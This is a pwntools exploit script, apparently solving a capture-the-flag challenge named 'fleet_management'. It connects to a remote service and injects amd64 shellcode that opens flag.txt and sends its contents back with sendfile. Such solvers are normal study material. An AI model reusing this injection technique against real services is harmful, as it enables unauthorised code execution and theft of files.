#!/usr/bin/python3
from pwn import *

context.binary = exe = ELF('./fleet_management',checksec=False)
context.arch = 'amd64'
#p = process()
p = remote('83.136.255.253',47780)
#gdb.attach(p,gdbscript='''
#           brva 0x0000000000001442
#           ''')

#openat(fd='AT_FDCWD', file='flag.txt', oflag='O_RDONLY')
# push b'flag.txt\x00

#sendfile(out_fd=1, in_fd='rax', offset=0, count=0x100)

shellcode = asm(f"""
        xor  rdx, rdx
        push rdx
        mov  rsi, {u64(b'flag.txt')}
        push rsi
        push rsp
        pop  rsi
        xor  rdi, rdi
        sub  rdi, 100
        mov  rax, 0x101
        syscall

        mov  rcx, 0x100
        mov  esi, eax
        xor  rdi, rdi#
        inc  edi
        mov  al, 0x28
        syscall
                
        mov  al, 0x3c
        syscall

        """)
#shellcode = shellcraft.openat('AT_FDCWD', 'flag.txt', 'O_RDONLY')
#shellcode += shellcraft.sendfile(1, 'rax', 0, 64)
#shellcode += shellcraft.exit()
#payload = asm(shellcode)

p.sendlineafter(b'[*] What do you want to do? ',b'9')
#input()
p.send(shellcode)


p.interactive()
